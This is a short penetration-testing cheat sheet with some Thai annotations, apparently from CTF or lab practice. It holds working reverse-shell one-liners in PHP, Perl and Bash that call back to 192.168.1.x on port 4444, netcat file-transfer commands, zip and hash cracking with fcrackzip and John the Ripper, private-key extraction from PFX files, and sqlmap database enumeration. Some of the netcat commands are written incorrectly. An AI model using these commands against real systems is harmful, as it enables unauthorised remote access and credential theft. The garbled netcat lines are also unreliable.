filter permission error
`find /etc/passwd 2>/dev/null` 

### Crack zip file
fcrackzip
```
fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
```

### nmap
`nmap -Pn -sC -sV 10.10.xxx.xx`

### John the ripper
`john -wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 file-name.txt`
`john -wordlist='/usr/share/wordlists/rockyou.txt file-name.hash rule /usr/share/john/rules/rockyou-30000.rule`

### Extract Certificates and Private key
Extract the Private key from PFX
```
openssl pkcs12 -in myfile.pfx -nocerts -out priv-key.pem -nodes
```

Extract the Certificate
```
openssl pkcs12 -in myfile.pfx -nokeys -out certificate.pem 
```


Upload netcat  
Tester  
`nc -lvnp 4444 < exploit.sh ` 
  
Target  
`nc -lvnp 192.168.x.xxx[host port] > exploit.sh  `
  
Dowload  
tester  
`nc -lvnp [target port] > exploit.sh เขียนทับ`  
  
Target  
`nc -lvnp 4444 < exploit.sh ส่งออก`

  

Php reverse shell

`php -r '$sock=fsockopen("192.168.1.223",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

Perl reverse shell
```
perl -e 'use  
Socket;$i="192.168.1.223";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(conne  
ct(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S"  
);exec("/bin/sh -i");};'
```

Bash reverse shell
`bash -i >& /dev/tcp/192.168.1.119/4444 0>&1`

`wget -no-check-certificate [path-file-name] -O test.txt`
Bash -e คือเอา bash ฝั่งนั้น
Spawn shell
`python -c 'import pty;pty.spawn("/bin/bash")'`

`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

### Set Environment
`export TERM=xterm`  
`set | grep TERM`

### sqlmap
```
sqlmap -r req.txt --dbs --dbms mysql
```

-r use request from burp
--batch no asking user
-p parameter